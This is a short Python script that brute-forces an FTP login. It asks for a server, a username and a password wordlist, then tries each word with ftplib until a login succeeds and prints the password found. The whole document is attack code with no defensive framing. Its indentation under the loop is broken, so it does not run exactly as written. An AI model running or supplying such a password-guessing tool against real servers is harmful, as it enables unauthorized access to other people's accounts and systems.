#! /usr/bin/python3

import ftplib

server = input("FTP Server: ")

user = input("Username: ")

Passwordlist = input("Path to Password List: ")

try:

    with open(Passwordlist, 'r') as pw:

        for word in pw:
        
        word = word.strip('\r\n')

        try:
            ftp = ftplib.FTP(server)

            ftp.login(user, word)

            print("Attempt successful. The password is " + word)
            
        except ftplib.error_perm as exc:

            print('still trying...', exc)

except Exception as exc:

    print('Wordlist error: ', exc)
